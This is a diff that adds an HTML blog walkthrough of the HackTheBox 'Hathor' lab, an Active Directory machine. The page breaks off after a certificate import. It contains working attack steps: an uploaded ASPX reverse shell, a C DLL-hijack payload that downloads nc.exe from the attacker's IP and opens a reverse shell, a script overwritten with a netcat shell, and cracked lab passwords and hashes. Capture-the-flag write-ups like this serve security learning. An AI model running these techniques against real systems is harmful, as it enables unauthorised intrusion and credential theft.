@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html>
+<div id="particles-js">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/Scripts/js/particles.js"></script>
+    <script src="/Scripts/js/app.js"></script>
+<title>Hathor HackTheBox Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/hathor/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+        <div style="height: 7rem;"></div>
+      </header>
+
+      <main class="app-container">		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Hathor Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">IIS</a>
+				<a class="tag" href="#">Default-Creds</a>
+				<a class="tag" href="#">ASPX</a>
+				<a class="tag" href="#">Get-bADpasswords</a>
+				<a class="tag" href="#">Information-Leakage</a>
+				<a class="tag" href="#">Hashcat</a>
+				<a class="tag" href="#">User-Impersonation</a>
+				<a class="tag" href="#">SMB</a>
+				<a class="tag" href="#">DLL-Hijacking</a>
+				<a class="tag" href="#">PFX</a>
+				<a class="tag" href="#">Get-ADReplAccount</a>
+				<a class="tag" href="#">Ticketer</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" style="max-width: 597px;" src="/images/HTB/hathor/hathor_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Hathor Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Hathor" rel="noreferrer noopener" target="_blank">Hathor</a> machine on HackTheBox, submitted by 
+			<a href="https://app.hackthebox.com/users/55079" rel="noreferrer noopener" target="_blank">4ndr34z</a>. The machine starts from an IIS,
+			where we can find a web running wich will be the future windcorp intranet, after looking through directories we found default credentials, once in we realize that the file manager is vulnerable to RCE and we can get a shell.
+			Once in we found an interesting tool <a href="https://app.hackthebox.com/users/55079" rel="noreferrer noopener" target="_blank">Get-bADpasswords</a> which we can abuse its misconfiguration to get a user hash.
+			Leading to impersonate the compromised user and be able to access their shared resources via SMB, which are part of a process that runs in the background, 
+			We will take advantage of it and do a dll hijacking to get a shell like GinaWild which executes the task, after that, we find a pfx file in the Recycle Bin, which we will use to sign the new <a href="https://app.hackthebox.com/users/55079" rel="noreferrer noopener" target="_blank">Get-bADpasswords</a> script that we are going to hijack to get a shell.
+			Once as bpassrunner we can dump the hashes with <a href="https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADReplAccount.md" rel="noreferrer noopener" target="_blank">Get-ADReplAccount</a> and request a ticket which will be useful to list the C drive	as a privilege user via SMB.		
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+			<p>Let's start with a basic port scan, once the scan is done, we can see the common ports of an AD, after enumerate the service and version we find as domain name windcorp.htb, we save it in /etc/hosts</p>
+			<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+# Nmap 7.92 scan initiated Sun Oct 30 04:18:28 2022 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allPorts 10.10.11.147
+<span class="ld"># <span class="na">Ports</span> scanned: TCP<span class="gd">(</span><span class="s">65535</span><span class="gd">;</span><span class="s">1</span><span class="gd">-</span><span class="s">65535</span><span class="gd">)</span> UDP<span class="gd">(</span><span class="s">0</span><span class="gd">;)</span> SCTP<span class="gd">(</span><span class="s">0</span><span class="gd">;)</span> PROTOCOLS<span class="gd">(</span><span class="s">0</span><span class="gd">;)</span>
+<span class="na">Host</span><span class="gd">:</span> <span class="s">10.10.11.147</span> <span class="gd">()</span>	<span class="na">Status</span>: <span class="na">Up</span>
+<span class="na">Host</span><span class="gd">:</span> <span class="s">10.10.11.147</span> <span class="gd">()</span>	<span class="na">Ports</span>: 
+PORT  	  STATE	SERVICE
+<span class="s">53</span><span class="k">/</span>tcp	  open  domain
+<span class="s">80</span><span class="k">/</span>tcp	  open  http
+<span class="s">88</span><span class="k">/</span>tcp	  open  kerberos-sec
+<span class="s">135</span><span class="k">/</span>tcp	  open  msrpc
+<span class="s">139</span><span class="k">/</span>tcp   open  netbios-ssn
+<span class="s">389</span><span class="k">/</span>tcp   open  ldap
+<span class="s">445</span><span class="k">/</span>tcp   open  microsoft-ds
+<span class="s">464</span><span class="k">/</span>tcp   open  kpasswd5
+<span class="s">593</span><span class="k">/</span>tcp   open  http-rpc-epmap
+<span class="s">636</span><span class="k">/</span>tcp   open  ldapssl
+<span class="s">3268</span><span class="k">/</span>tcp  open  globalcatLDAP
+<span class="s">3269</span><span class="k">/</span>tcp  open  globalcatLDAPssl
+<span class="s">5985</span><span class="k">/</span>tcp  open  wsman 
+<span class="s">9389</span><span class="k">/</span>tcp  open  adws
+<span class="s">49664</span><span class="k">/</span>tcp open  unknown
+<span class="s">49668</span><span class="k">/</span>tcp open  unknown
+<span class="s">49670</span><span class="k">/</span>tcp open  unknown
+<span class="s">49690</span><span class="k">/</span>tcp open  unknown
+<span class="s">49693</span><span class="k">/</span>tcp open  unknown
+<span class="s">56323</span><span class="k">/</span>tcp open  unknown
+Ignored State<span class="gd">:</span> filtered <span class="gd">(</span><span class="s">65515</span><span class="gd">)</span></span>
+# Nmap done at Sun Oct 30 04:19:12 2022 -- 1 IP address (1 host up) scanned in 44.03 seconds
+			</code></pre></div></div>
+
+			<p class="head-img">After running whatweb we find that it's an <a href="https://www.techtarget.com/searchwindowsserver/definition/IIS" rel="noreferrer noopener" target="_blank" >IIS</a>, there are some cookies among other things, let's take a look at the web</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> whatweb </span>windcorp.htb
+<span class="x">http://windcorp.htb</span> [200 OK] ASP_NET[<span class="na">4.0.30319</span>], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][<span class="gd">ZZ</span>], 
+HTML5, HTTPServer[<span class="kt">Microsoft-IIS/10.0</span>], HttpOnly[ASP.NET_SessionId], IP[10.10.11.147], JQuery[<span class="na">3.2.1</span>], 
+Microsoft-IIS[<span class="na">10.0</span>], OpenSearch[http://windcorp.htb/SearchEngineInfo.ashx], Script[text/javascript], 
+Title[<span class="k">Home - mojoPortal</span>][<span class="gd">Title element contains newline(s)!</span>], X-Powered-By[ASP.NET], X-UA-Compatible[ie=edge]
+</span>	</code></pre></div></div>
+
+			
+            <p class="head-img">After searching for a while we didn't find anything interesting, the only thing that catches my attention is the login, but first let's enumerate some directories</p>
+            <img class="img-post" style="max-width: 391px;" src="/images/HTB/hathor/windcorp_web.png"></img>
+
+
+			<p class="head-img">We found some interesting ones, let's take a look</p>
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> gobuster </span>dir --no-error -t 200 -u http://windcorp.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x aspx
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://windcorp.htb/
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              aspx
+[+] Timeout:                 10s
+===============================================================
+2022/11/01 19:17:40 Starting gobuster in directory enumeration mode
+===============================================================
+/blog                 (Status: 301) [Size: 148] [--> http://windcorp.htb/blog/]
+/home                 (Status: 200) [Size: 11222]                              
+/services             (Status: 301) [Size: 152] [--> http://windcorp.htb/services/]
+/forums               (Status: 301) [Size: 150] [--> http://windcorp.htb/forums/]  
+/modules              (Status: 301) [Size: 151] [--> http://windcorp.htb/modules/] 
+/comments             (Status: 301) [Size: 152] [--> http://windcorp.htb/comments/]
+/data                 (Status: 301) [Size: 148] [--> http://windcorp.htb/data/]    
+/default.aspx         (Status: 200) [Size: 11230]                                  
+/sitemap.aspx         (Status: 200) [Size: 11793]                                  
+/help.aspx            (Status: 200) [Size: 814]                                    
+/content              (Status: 301) [Size: 151] [--> http://windcorp.htb/content/] 
+/list                 (Status: 301) [Size: 148] [--> http://windcorp.htb/list/]    
+/admin                (Status: 301) [Size: 149] [--> http://windcorp.htb/admin/]   
+/scripts              (Status: 301) [Size: 151] [--> http://windcorp.htb/scripts/] 
+/Home                 (Status: 200) [Size: 11222]                                  
+/Default.aspx         (Status: 200) [Size: 11230]                                  
+/memberlist.aspx      (Status: 302) [Size: 149] [--> http://windcorp.htb/Default.aspx]
+/survey               (Status: 301) [Size: 150] [--> http://windcorp.htb/survey/]     
+/redirect.aspx        (Status: 302) [Size: 149] [--> http://windcorp.htb/Default.aspx]
+/poll                 (Status: 301) [Size: 148] [--> http://windcorp.htb/poll/]       
+/Help.aspx            (Status: 200) [Size: 814]                                       
+/secure               (Status: 301) [Size: 150] [--> http://windcorp.htb/secure/]     
+/Content              (Status: 301) [Size: 151] [--> http://windcorp.htb/Content/]    
+/Blog                 (Status: 301) [Size: 148] [--> http://windcorp.htb/Blog/]       
+/Services             (Status: 301) [Size: 152] [--> http://windcorp.htb/Services/]   
+/SiteMap.aspx         (Status: 200) [Size: 11793]                                     
+/Forums               (Status: 301) [Size: 150] [--> http://windcorp.htb/Forums/]     
+/setup                (Status: 301) [Size: 149] [--> http://windcorp.htb/setup/]      
+/siteMap.aspx         (Status: 200) [Size: 11793]                                     
+/Sitemap.aspx         (Status: 200) [Size: 11793]                                     
+/SearchResults.aspx   (Status: 200) [Size: 15121]                                     
+/searchresults.aspx   (Status: 200) [Size: 15121]                                     
+/Scripts              (Status: 301) [Size: 151] [--> http://windcorp.htb/Scripts/]    
+/Data                 (Status: 301) [Size: 148] [--> http://windcorp.htb/Data/]       
+/List                 (Status: 301) [Size: 148] [--> http://windcorp.htb/List/]       
+/Modules              (Status: 301) [Size: 151] [--> http://windcorp.htb/Modules/]    
+/Comments             (Status: 301) [Size: 152] [--> http://windcorp.htb/Comments/]   
+/Survey               (Status: 301) [Size: 150] [--> http://windcorp.htb/Survey/]     
+/Admin                (Status: 301) [Size: 149] [--> http://windcorp.htb/Admin/]      
+/controls             (Status: 301) [Size: 152] [--> http://windcorp.htb/controls/]   
+/Redirect.aspx        (Status: 302) [Size: 149] [--> http://windcorp.htb/Default.aspx]
+/*checkout*           (Status: 302) [Size: 153] [--> /Error.htm?aspxerrorpath=/*checkout*]
+/contactform          (Status: 301) [Size: 155] [--> http://windcorp.htb/contactform/]    
+/*checkout*.aspx      (Status: 302) [Size: 158] [--> /Error.htm?aspxerrorpath=/*checkout*.aspx]
+/closed.aspx          (Status: 302) [Size: 9975] [--> http://windcorp.htb/Default.aspx]        
+/HOME                 (Status: 200) [Size: 11222]                                              
+/Controls             (Status: 301) [Size: 152] [--> http://windcorp.htb/Controls/]            
+/Setup                (Status: 301) [Size: 149] [--> http://windcorp.htb/Setup/]               
+/Secure               (Status: 301) [Size: 150] [--> http://windcorp.htb/Secure/]              
+/App_Themes           (Status: 301) [Size: 154] [--> http://windcorp.htb/App_Themes/]          
+/App_Themes.aspx      (Status: 302) [Size: 158] [--> /Error.htm?aspxerrorpath=/App_Themes.aspx]
+Progress: 30144 / 441122 (6.83%)                                                              
+[!] Keyboard interrupt detected, terminating.
+                                                                                               
+===============================================================
+2022/11/01 19:25:29 Finished
+===============================================================
+</span> </code></pre></div></div>
+
+			<p class="head-img">It is worth mentioning that while the gobuster scan finished I played a bit with the login, but it didn't take us anywhere, however in the initial setup of mojoPortal we find default credentials</p>
+            <img class="img-post" style="max-width: 673px;" src="/images/HTB/hathor/windcorp_default_creds.png"></img>
+
+			<p class="head-img">Once inside we find an administration panel</p>
+			<img class="img-post" style="max-width: 1154px;" src="/images/HTB/hathor/administration_panel.png"></img>
+
+			<p class="head-img">We found that the file manager may be vulnerable, we cannot create or upload .aspx files, but we can change the content of one already created, we are going to change the content to send us a <a href="https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx" rel="noreferrer noopener" target="_blank">reverse shell</a></p>
+			<img class="img-post" style="max-width: 897px;" src="/images/HTB/hathor/edit_file.png"></img>
+	
+			<p class="head-img">We copy it to another directory and change the name, then we make the request</p>
+			<img class="img-post" style="max-width: 596px;" src="/images/HTB/hathor/copy_shell.png"></img>
+
+			<p class="head-img">Due to the .aspx file filter, it seems that the file hasn't been copied, but we can make the request from the URL</p>
+            <img class="img-post" style="max-width: 453px;" src="/images/HTB/hathor/request.png"></img>
+
+			<p class="head-img">After poking around we found an interesting directory, doing some research we found that <a href="https://github.com/improsec/Get-bADpasswords" rel="noreferrer noopener" target="_blank">Get-bADpasswords</a> compares user hashes to determine if the password is weak or not.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                  
+<span class="ld"><span class="k">c:\Get-bADpasswords></span> dir
+ Volume in drive C has no label.
+ Volume Serial Number is BE61-D5E0
+
+ Directory of <span class="kt">c:\Get-bADpasswords</span>
+
+10/12/2022  08:30 PM    <span><</span>DIR>          .
+09/29/2021  07:18 PM    <span><</span>DIR>          Accessible
+10/12/2022  09:04 PM            11,694 CredentialManager.psm1
+03/21/2022  02:59 PM            20,320 Get-bADpasswords.ps1
+09/29/2021  05:53 PM           177,250 Get-bADpasswords_2.jpg
+10/12/2022  09:04 PM             5,184 Helper_Logging.ps1
+10/12/2022  09:04 PM             6,561 Helper_Passwords.ps1
+09/29/2021  05:53 PM           149,012 Image.png
+09/29/2021  05:53 PM             1,512 LICENSE.md
+10/12/2022  09:04 PM             4,499 New-bADpasswordLists-Common.ps1
+10/12/2022  09:04 PM             4,335 New-bADpasswordLists-Custom.ps1
+10/12/2022  09:04 PM             4,491 New-bADpasswordLists-customlist.ps1
+10/12/2022  09:04 PM             4,740 New-bADpasswordLists-Danish.ps1
+10/12/2022  09:04 PM             4,594 New-bADpasswordLists-English.ps1
+10/12/2022  09:04 PM             4,743 New-bADpasswordLists-Norwegian.ps1
+09/29/2021  05:54 PM    <span><</span>DIR>          PSI
+09/29/2021  05:53 PM             6,567 README.md
+10/12/2022  09:04 PM             3,982 run.vbs
+09/29/2021  05:54 PM    <span><</span>DIR>          Source
+              15 File(s)        409,484 bytes
+               4 Dir(s)   9,318,952,960 bytes free
+
+<span class="k">c:\Get-bADpasswords></span></span>
+</span> </code></pre></div></div>
+
+            <blockquote>
+              <p>Something important to keep in mind is that to run it needs Domain Admin privileges or similar, this can come in handy when the privilege escalation moment arrives</p>
+              <p>In this scheme we can clearly see how it works from behind</p>
+            </blockquote>
+            <img class="img-post" style="max-width: 596px;" src="https://raw.githubusercontent.com/improsec/Get-bADpasswords/master/Get-bADpasswords_2.jpg"></img>
+
+            <p class="head-img">Taking a look at the script configuration, we find that even if a weak password is found, it will not be changed, and we also found the logs path, take a look at it, and see if we can find a hash</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld">#Actions if password is weak
+# - resetPWd = Resets the users password to a random password
+# - removeNoExpire = Unticks "Password never expires"
+# - changePassLogon = Ticks the "The user must change password on next logon"
+#
+#IMPORTANT: If resetPwd is enabled, the users password will be changed to a random password.
+#That password are logged in logfile, so remember to delete the logs.
+
+$resetPwd = $false 
+$removeNoExpire = $false
+$changePassLogon = $false
+
+$log_filename  = <span class="kt">".\Accessible\Logs\log_$domain_name-$current_timestamp.txt"</span>
+$csv_filename  = <span class="kt">".\Accessible\CSVs\exported_$domain_name-$current_timestamp.csv"</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Apparently BeatriceMill has a weak password, let's see if it appears in the .csv files</span>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">c:\Get-bADpasswords\Accessible\Logs></span> type log_windcorp-03102021-173510.txt
+03.10.2021-17:35:11     info    Version:        'Get-bADpasswords v3.03'.
+03.10.2021-17:35:11     info    Log file:       '.\Accessible\Logs\log_windcorp-03102021-173510.txt'.
+03.10.2021-17:35:11     info    CSV file:       '.\Accessible\CSVs\exported_windcorp-03102021-173510.csv'.
+<......................................................................>
+03.10.2021-17:35:41     info    Found 1 user(s) with weak passwords.
+03.10.2021-17:35:41     info    <span class="gd">Matched password found for user 'BeatriceMill' in list(s) 'leaked-passwords-v7'.</span>
+<......................................................................>
+<span class="k">c:\Get-bADpasswords\Accessible\Logs></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Nice, we have a NT hash, since it's weak, let's see if we can crack it locally</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">c:\Get-bADpasswords\Accessible\CSVs></span> type exported_windcorp-03102021-173510.csv
+Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
+active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;<span class="gd">9cb01504ba0247ad5c6e08f7ccae7903</span>;'leaked-passwords-v7'
+
+<span class="k">c:\Get-bADpasswords\Accessible\CSVs></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Well, now we have the password, let's try to dig a little deeper and see how we can take advantage of it</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> hashcat </span>-O -m 1000 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+<...........................................................................>
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344395
+* Bytes.....: 139921684
+* Keyspace..: 14344395
+
+Approaching final keyspace - workload adjusted.  
+
+9cb01504ba0247ad5c6e08f7ccae7903:<span class="gd">!!!!ilovegood17</span> 
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NTLM
+Hash.Target......: 9cb01504ba0247ad5c6e08f7ccae7903
+Time.Started.....: Tue Nov  1 22:44:51 2022 (20 secs)
+Time.Estimated...: Tue Nov  1 22:45:11 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   790.9 kH/s (0.81ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 14344395/14344395 (100.00%)
+Rejected.........: 6538/14344395 (0.05%)
+Restore.Point....: 14343560/14344395 (99.99%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: !!anthony!!
+
+Started: Tue Nov  1 22:44:03 2022
+Stopped: Tue Nov  1 22:44:42 2022
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">If we check the SMB shares we find a share directory, but we can't access it from our current shell, let's try to impersonate Beatrice and get another shell, we must edit the <a href="https://pastebin.com/DGt7TKYx" rel="noreferrer noopener" target="_blank">script</a>, and upload it back to the web</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\Get-bADpasswords\Accessible\CSVs></span> Get-SmbShare
+
+Name     ScopeName Path                                          Description        
+----     --------- ----                                          -----------        
+ADMIN$   *         C:\WINDOWS                                    Remote Admin       
+C$       *         C:\                                           Default share      
+IPC$     *                                                       Remote IPC         
+NETLOGON *         C:\Windows\SYSVOL\sysvol\windcorp.htb\SCRIPTS Logon server share 
+<span class="kt">share    *         C:\share                                                         </span>
+SYSVOL   *         C:\Windows\SYSVOL\sysvol                      Logon server share 
+
+<span class="k">PS C:\Get-bADpasswords\Accessible\CSVs></span> net use j: \\hathor\share /u:windcorp.htb\beatricemill !!!!ilovegood17
+The command completed successfully.
+
+<span class="k">PS C:\Get-bADpasswords\Accessible\CSVs></span> pushd j:
+<span class="k">PS j:\></span> dir
+
+    Directory: j:\
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         3/21/2022  10:22 PM                scripts                                                              
+-a----         3/15/2018   2:17 PM        1013928 AutoIt3_x64.exe                                                      
+-a----         9/19/2019  10:15 PM        4601208 Bginfo64.exe                                                         
+
+
+<span class="k">PS j:\> </span>
+</span> </code></pre></div></div>
+
+			<p class="head-img">Let's make another request and catch the shell</p>
+            <img class="img-post" style="max-width: 643px;" src="/images/HTB/hathor/request2.png"></img>
+
+            <p class="head-img">Once inside, if we list the processes, one appears that wasn't there before, apparently it is the .exe from the shared directory, we can try to hijack a dll from the scripts directory, seems like we can overwrite it</spa>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\share\scripts></span> Get-Process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+     91       6     1004       5032              4100   0 AggregatorHost                                               
+    309      18     3920      20560             10704   1 <span class="kt">Bginfo64</span>                                                     
+    372      31    11992      20644              2880   0 certsrv  
+<........................................................................>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's create the dll, once the .exe is executed it will hit our server and replace Bginfo64.exe with netcat we just have to wait for the shell </p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯ </span><span class="ld"><span class="kt">cat </span>dll.c
+
+<span class="cp"># include</span> <span class="k"><</span><span class="k">windows.h></span>
+<span class="na">BOOL APIENTRY DllMain</span>(<span class="na">HMODULE hModule</span>, <span class="na">DWORD</span>  <span class="ng">ul_reason_for_call</span>, <span class="na">LPVOID</span> <span class="ng">lpReserved</span>)
+{
+<span class="cp">  switch</span> (ul_reason_for_call)
+    {
+    <span class="cp">case</span> DLL_PROCESS_ATTACH:
+      <span class="kt">system</span>(<span class="k">"takeown /f C:<span class="s">\\</span>share<span class="s">\\</span>Bginfo64.exe"</span>);
+      <span class="kt">system</span>(<span class="k">"icacls C:<span class="s">\\</span>share<span class="s">\\</span>Bginfo64.exe /grant Everyone:F /T"</span>);
+      <span class="kt">system</span>(<span class="k">"curl <span class="s">10.10.16.25</span>/nc.exe -o c:<span class="s">\\</span>share<span class="s">\\</span>Bginfo64.exe"</span>);
+      <span class="kt">system</span>(<span class="k">"C:<span class="s">\\</span>share<span class="s">\\</span>Bginfo64.exe <span class="s">10.10.16.25 666</span> -e cmd.exe"</span>);
+<span class="cp">      break</span>;
+<span class="cp">    case</span> DLL_THREAD_ATTACH:
+<span class="cp">    case</span> DLL_THREAD_DETACH:
+<span class="cp">    case</span> DLL_PROCESS_DETACH:
+<span class="cp">      break</span>;
+    }
+<span class="cp">  return</span> <span class="s">TRUE</span>;
+}
+
+<span class="na">❯ </span><span class="kt">x86_64-w64-mingw32-gcc</span> dll.c -o 7-zip64.dll -shared
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's overwrite the dll</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">c:\share\scripts></span> curl -s http://10.10.16.25/7-zip64.dll -o 7-zip64.dll
+
+<span class="k">c:\share\scripts></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">And about a minute later, we get the shell and we can read the user flag.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">rlwrap </span>sudo nc -nlvp 666
+[sudo] password for 0xv01d: 
+listening on [any] 666 ...
+connect to [10.10.16.25] from (UNKNOWN) [10.10.11.147] 65322
+Microsoft Windows [Version 10.0.20348.643]
+(c) Microsoft Corporation. All rights reserved.
+
+<span class="k">c:\share></span> whoami
+windcorp\ginawild
+
+<span class="k">c:\share></span> type c:\Users\GinaWild\Desktop\user.txt
+08a72442eb7ff3a44a219c9a69941cc9
+
+<span class="k">c:\share></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">After searching for a while we found a pfx in the Recycle Bin, at this point we can connect some the dots, as we saw before the Get-bADpasswords script runs as domain Admin or similar, so we can take advantage of it and try to hijack it, but first let's download it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">c:\$Recycle.Bin></span> dir */s
+ Volume in drive C has no label.
+ Volume Serial Number is BE61-D5E0
+
+ Directory of c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663
+
+10/12/2022  08:26 PM                98 $IZIX7VV.pfx
+03/21/2022  03:37 PM             4,053 $RLYS3KF.pfx
+10/12/2022  07:43 PM             4,280 $RZIX7VV.pfx
+               3 File(s)          8,431 bytes
+
+     Total Files Listed:
+               3 File(s)          8,431 bytes
+               0 Dir(s)   9,342,066,688 bytes free
+
+<span class="k">c:\$Recycle.Bin></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">We can encode it in base64 to later decode it locally</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663></span> certutil -encode -f $RLYS3KF.pfx tmp.b64 && cls && findstr /v /c:- tmp.b64 && del tmp.b64
+Input Length = 4053
+Output Length = 5630
+CertUtil: -encode command completed successfully.
+
+MIIP0QIBAzCCD5cGCSqGSIb3DQEHAaCCD4gEgg+EMIIPgDCCCjcGCSqGSIb3DQEH
+BqCCCigwggokAgEAMIIKHQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQYwDgQIiXBG
+<...............................................................>
+XPocwFukcz1RtEUaD9TS66rM9ol0D9eKeAo7MSUwIwYJKoZIhvcNAQkVMRYEFCBP
+Ekc/1pEVhFASFXWCcLJXAdBJMDEwITAJBgUrDgMCGgUABBSqKPm3faVVdt0yGvk8
+oIrzPl0pwwQIB8GRoLEuSnwCAggA
+
+<span class="k">c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663></span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">Let's bruteforce it and get the password</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="na">❯ </span><span class="kt">crackpkcs12 </span>-d /usr/share/wordlists/rockyou.txt file.pfx
+
+Dictionary attack - Starting 1 threads
+
+*********************************************************
+Dictionary attack - Thread 1 - Password found: <span class="gd">abceasyas123</span>
+*********************************************************
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now we can hijack the Get-bADpasswords script and sign it with the pfx to get another shell</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">c:\Get-bADpasswords></span> mkdir c:\pwn
+<span class="k">c:\Get-bADpasswords></span> move Get-bADpasswords.ps1 c:\pwn\bADpasswords.ps1
+<span class="k">c:\Get-bADpasswords></span> cmd.exe /c "echo C:\share\Bginfo64.exe 10.10.16.25 9999 -e cmd > Get-bADpasswords.ps1"
+<span class="k">c:\Get-bADpasswords></span> copy c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx c:\pwn\signature.pfx
+</span> </code></pre></div></div>
+
+            <p class="head-img">Now let's sign the script</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">PS C:\Get-bADpasswords></span> certutil -user -p abceasyas123 -importpfx C:\pwn\signature.pfx NoChain,NoRoot
+Certificate "Administrator" added to store.
+
+CertUtil: -importPFX command completed successfully.
